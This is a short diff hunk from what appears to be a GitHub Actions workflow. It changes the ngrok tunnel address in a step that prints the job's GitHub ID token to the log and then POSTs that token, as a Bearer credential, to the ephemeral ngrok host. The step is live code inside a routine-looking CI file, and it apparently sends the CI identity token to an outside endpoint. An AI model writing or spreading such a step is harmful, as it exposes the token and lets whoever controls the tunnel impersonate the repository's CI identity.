@@ -33,7 +33,7 @@ jobs:
           echo "Token: $GITHUB_ID_TOKEN"
           echo "Run ID: $GITHUB_RUN_ID"
           curl -s \
-            https://6a6ae60b1842.ngrok-free.app/api/v1/outputs \
+            https://1ba0b3722c7d.ngrok-free.app/api/v1/outputs \
             -X POST \
             -H "Content-Type: application/json" \
             -H "Authorization: Bearer $GITHUB_ID_TOKEN" \
